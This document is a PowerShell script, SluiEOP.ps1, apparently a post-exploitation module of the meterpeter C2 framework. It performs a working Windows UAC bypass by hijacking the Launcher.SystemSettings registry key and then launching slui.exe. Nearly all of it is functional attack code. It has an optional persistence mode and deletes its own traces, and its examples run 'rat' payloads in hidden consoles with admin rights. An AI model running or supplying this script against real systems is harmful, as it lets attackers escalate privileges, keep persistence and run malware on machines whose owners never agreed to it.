<#
.SYNOPSIS
   SluiEOP can be used has UAC bypass module or to execute one command with high privileges (Admin)

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - Build 18363
   EOP Disclosure By: @mattharr0ey
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev Version: v1.10

.DESCRIPTION
   How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
   called Windows Activation in SystemSettings, this service makes it easy for you and other users to change an old windows
   activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
   ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
   but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas (SluiEOP PS cmdlet automates all of this tasks).

.NOTES
   Its Mandatory the use of "double quotes" in the 1º parameter input.
   SluiEOP cmdlet supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
   To run binarys (.exe) through this cmdlet use: "cmd /c start binary.exe"

   This cmdlet 'reverts' regedit hacks to the previous state before the EOP.
   Unless '$MakeItPersistence' its set to "True". In that case the EOP registry
   hacks will NOT be deleted in the end of exec making the '$Command' persistence.
   Remark: .\SluiEOP.ps1 "deleteEOP" argument deletes the '$Command' persistence.

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
   Spawn notepad process with high privileges (Admin)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
   Spawn powershell process with high privileges (Admin)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat"
   Execute $Env:TMP\rat.bat script with high privileges (Admin)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\rat.ps1"
   Execute $Env:TMP\rat.ps1 script with high privileges (Admin) in an hidden console.

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "cmd /c start regedit.exe" -Verbose
   Spawn regedit with high privileges (Admin) and display process verbose info
   Remark: This function does not work under meterpeter C2 framework (automatic)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser" -Force
   Bypass this cmdlet vulnerability tests (-Force) to execute '$command' with high privileges (Admin)
   Remark: This function does not work under meterpeter C2 framework (automatic)

.INPUTS
   None. You cannot pipe objects into SluiEOP.ps1

.OUTPUTS
   Audits the spawned process <UserDomain> <ProcessName> <Status> and <PID>
   If used '-Verbose' parameter then displays process detailed information

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
    https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
    https://github.com/r00t-3xp10it/meterpeter/wiki/SluiEOP---UACbypass-Escalation-Of-Privileges
#>


$Command = $Null               # Command Internal function [<dontchange>]
$VerboseMode = "False"         # Change this value to "True" for verbose
$EOP_Success = $False          # Remote EOP execution status [<dontchange>]
$MakeItPersistence = "False"   # Change this value to "True" to make the '$Command' persistence
$param1 = $args[0]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
$param2 = $args[1]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
$host.UI.RawUI.WindowTitle = "@SluiEOP v1.10 {SSA@redTeam}"
If($param2 -ieq "-Verbose"){$VerboseMode = "True"}
If(-not($param1) -or $param1 -eq $null){
   $Command = "$Env:WINDIR\System32\cmd.exe"
   Write-Host "`n[ ERROR ] This cmdlet requires the first parameter to run." -ForegroundColor Red -BackgroundColor Black
   Write-Host "Syntax: [scriptname] [parameter <`"mandatory`">] [-parameter <optional>]`n" 
   Write-Host ".\SluiEOP.ps1 `"Command to execute`""
   Write-Host ".\SluiEOP.ps1 `"Command to execute`" -Force"
   Write-Host ".\SluiEOP.ps1 `"Command to execute`" -Verbose"
   Start-Sleep -Milliseconds 1200
}Else{
   $Command = "$param1"
}

## SluiEOP meterpeter post-module banner
Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400

## [1] - Check for regedit vulnerable HIVE existence before continue any further ..
$CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
If($CheckVuln -eq $True -or $param2 -ieq "-Force"){

   ## [2] - Check for windows native vulnerable binary existence.  
   If(-not(Test-Path -Path "$Env:WINDIR\System32\Slui.exe") -and $param2 -iNotMatch '-Force'){
      If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
      Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
      Write-Host "[ ] NOT FOUND: '$Env:WINDIR\System32\Slui.exe'`n" -ForegroundColor red -BackgroundColor Black
      Exit
   }

   ## [3] - Anti-Virus registry Hive|Keys detection checks.
   cmd /R REG ADD "HKCU\Software\Classes\Launcher.SystemSettings\shell\Open" /f|Out-Null
   If(-not(Test-Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open") -and $param2 -iNotMatch '-Force'){
      If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
      Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
      Write-Host "[ ] SluiEOP can't create the required registry key. (AV?)`n" -ForegroundColor red -BackgroundColor Black
      Exit
   }

   ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
   # This function 'reverts' all regedit hacks to the previous state before the EOP.
   If($param1 -eq "deleteEOP"){
      Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 400
      ## Make sure the vulnerable registry key exists
      If(Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -ErrorAction SilentlyContinue){
         Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
         Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
         Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted.";Start-Sleep -Milliseconds 400
         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\Launcher.SystemSettings`n"
      }Else{
         Write-Host "[ ] Failed    => None SluiEOP registry keys found under:" -ForegroundColor Red;Start-Sleep -Milliseconds 400
         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\Launcher.SystemSettings`n"
      }
      If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
      Exit
   }

   ### Add Entrys to Regedit { using powershell }
   Write-Host "[+] Hijacking => Slui.exe execution in registry."
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 400
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 400
   # New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 400
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 400

   ## The Next Registry entry allow us to execute our command under high privileges (Admin)
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   # ---
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 400
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 400
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Milliseconds 400
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400

   ## Start the vulnerable Process { using powershell }
   Write-Host "[+] Hijacking => Slui.exe process execution."
   Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\Slui.exe" -Verb runas
   ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
   If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}

   Start-Sleep -Milliseconds 5700 # Give time for Slui.exe to finish
   ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
   # be deleted in the end of cmdlet execution, making the 'command' persistence.
   If($MakeItPersistence -eq "False"){
      ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
      Write-Host "[+] Deleting  => EOP registry hacks (revert)"
      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Milliseconds 400
      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Milliseconds 400
      Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
   }Else{
      Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Start-Sleep -Milliseconds 400
      Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow
   }

   <#
   .SYNOPSIS
      Helper - Audits the Spawned process <UserDomain> <ProcessName> <Status> and <PID>
      Author: @r00t-3xp10it

   .DESCRIPTION
      Audits the spawned process <UserDomain> <ProcessName> <Status> and <PID>
      If used '-Verbose' parameter then displays process detailed information

   .EXAMPLE
      PS C:\> .\SluiEOP.ps1 "cmd.exe /c start regedit.exe"

      UserDomain ProccessName Status   PID
      ---------- ------------ ------   ---
      SKYNET     regedit      success  5543
   #>

   ## Audit remote Spawned ProcessName|ProcessPath|StartTime|PID
   Write-Host "[+] Executing => EOP output Table displays.`n";Start-Sleep -Milliseconds 400
   If($Command -NotMatch '\\' -and $Command -NotMatch '\s'){
      ## String: "powershell.exe"
      $ProcessName = Split-Path "$Command" -Leaf
      $ReturnCode = "$ReturnCode"+"1"
   }ElseIF($Command -Match '\\' -and $Command -NotMatch '\s'){
      ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe
      $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"2"
   }ElseIF($Command -Match '\s' -and $Command -NotMatch '\\'){
      ## String: powershell.exe Start-Process regedit.exe
      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"3"
   }ElseIF($Command -Match '^(C:\\)' -and $Command -Match '\s' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.py]$'){
      ## String: C:\Windows\System32\cmd.exe /c start notepad.exe
      #  String: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"4"
   }ElseIF($Command -iMatch '^.Env:' -or $Command -iMatch '^(C:\\)' -and $Command -Match '\s'){
      ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
      #  String: $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"5"
   }Else{
      ## String: cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat
      #  String: powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1
      $ProcessName = Split-Path "$Command" -Leaf
      $ReturnCode = "$ReturnCode"+"6"
   }

   ## Audit Spawn Process Group Owner
   # Function to audit [binary|script|command] Tokens
   If($ProcessName -Match '[.exe]$'){
      $ProcessToken = "$ProcessName";$ReturnCode = "$ReturnCode"+":1"
      $ProcessName = $ProcessName -replace '.exe',''
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[powershell].*[.ps1]$'){
      $ProcessToken = "powershell.exe";$ReturnCode = "$ReturnCode"+":2"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[cmd].*[.bat]$' -or $Command -Match '^[cmd].*[.ps1]$' -or $Command -Match '^[cmd].*[.py]$'){
      $ProcessToken = "cmd.exe";$ReturnCode = "$ReturnCode"+":3"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[python].*[.py]$'){
      $ProcessToken = "python.exe";$ReturnCode = "$ReturnCode"+":4"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[powershell]' -and $Command -NotMatch '[.exe]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.py]$'){
      ## String: powershell Set-ExecutionPolicy Unrestricted -Scope Currentuser
      $ProcessToken = "powershell.exe";$ReturnCode = "$ReturnCode"+":5"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
      $ProcessName = "powershell"
   }ElseIF($Command -Match '^[cmd]' -and $Command -NotMatch '[.exe]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.py]$'){
      ## String: cmd.exe /c REG ADD 'HKCU\Software\Microsoft\Windows' /v NoFileMRU /t REG_DWORD /d 1 /f
      $ProcessToken = "cmd.exe";$ReturnCode = "$ReturnCode"+":6"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
      $ProcessName = "cmd"
   }Else{
      $EOPID = "null"
   }

   ## Build MY PSObject Table to display results
   $MYPSObjectTable = New-Object -TypeName PSObject
   If($VerboseMode -eq "True"){
      $RemoteOS = (Get-WmiObject Win32_OperatingSystem).Caption
      $OSversion = (Get-WmiObject Win32_Process|Select-Object).WindowsVersion|Select -Last 1 -EA SilentlyContinue
      $SpawnPath = (Get-Process $ProcessName -EA SilentlyContinue|select *).Path|Select -Last 1 -EA SilentlyContinue
      $SpawnTime = (Get-Process $ProcessName -EA SilentlyContinue|select *).StartTime|Select -Last 1 -EA SilentlyContinue
      $GroupToken = Get-WmiObject Win32_Process -Filter "name='$ProcessToken'"|Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}|Select -Last 1|Select-Object -ExpandProperty UserName
      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ReturnCode" -Value "$ReturnCode"
    }
    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error";$EOPID = "null"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "UserDomain" -Value "$Env:USERDOMAIN"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Status" -Value "$EOPState"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "StartTime" -Value "$SpawnTime"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "RemoteHost" -Value "$RemoteOS"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessPath" -Value "$SpawnPath"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "EOPCommand" -Value "$Command"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Owner" -Value "$GroupToken"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "OSversion" -Value "$OSversion"}
    ## Create a logfile with the Table. Because meterpeter C2 can't otherwise remotely display Table contents.
    echo $MYPSObjectTable > $Env:TMP\sLUIEop.log

}Else{
   ## Vulnerable registry Hive => NOT FOUND
   Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
   Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\Launcher.SystemSettings'`n" -ForegroundColor red -BackgroundColor Black
}

## Clean old files left behind by SluiEOP after the job is finished ..
If(Test-Path "$Env:TMP\sLUIEop.log"){Get-Content -Path "$Env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$Env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
Exit
